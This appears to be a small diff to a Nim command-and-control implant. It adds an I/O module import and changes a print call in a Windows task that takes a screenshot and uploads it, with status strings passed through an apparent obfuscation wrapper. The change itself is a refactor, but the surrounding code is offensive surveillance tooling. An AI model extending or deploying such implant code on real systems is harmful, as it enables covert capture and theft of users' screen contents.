@@ -30,6 +30,7 @@ when defined(agent):
     import winim/inc/wingdi
     import strutils, strformat, times, pixie
     import stb_image/write as stbiw
+    import ../agent/core/io
     import ../agent/protocol/result
     import ../common/[utils, serialize]
 
@@ -155,7 +156,7 @@ when defined(agent):
     proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
 
-            echo protect("    [>] Taking and uploading screenshot.")
+            print protect("    [>] Taking and uploading screenshot.")
 
             let
                 screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.jpeg"
